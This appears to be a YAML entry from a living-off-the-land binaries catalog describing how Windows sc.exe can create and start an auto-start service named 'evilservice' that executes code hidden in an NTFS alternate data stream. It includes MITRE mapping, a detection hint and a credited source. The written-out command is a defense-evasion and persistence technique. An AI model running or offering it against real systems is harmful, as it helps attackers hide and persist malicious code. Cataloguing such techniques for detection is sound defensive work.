---
name: Sc.exe
description: Used by Windows to manage services
functions:
  ads:
    - description: Creates a new service and executes the file stored in the ADS.
      code: sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary file hidden inside an alternate data stream
resources:
    - resource: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
fullpath:
    - path: C:\Windows\System32\sc.exe
    - path: C:\Windows\SysWOW64\sc.exe
detection:
  - IOC: Services that gets created
acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
